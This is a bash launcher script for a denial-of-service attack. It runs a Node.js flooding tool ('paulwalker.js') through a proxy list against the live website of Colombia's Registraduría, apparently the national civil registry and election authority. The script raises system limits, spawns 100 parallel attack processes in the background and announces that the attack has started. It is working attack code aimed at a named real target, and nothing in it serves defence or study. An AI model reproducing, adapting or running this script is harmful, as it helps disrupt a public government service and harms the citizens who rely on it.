#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="node paulwalker.js https://www.registraduria.gov.co/ proxy"

#number of process that you want
process=100

#change the system limit
ulimit -n 999999

echo ———————————————————————————
echo A T T A C K - S T A R T E D
echo ———————————————————————————
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 100.000
done
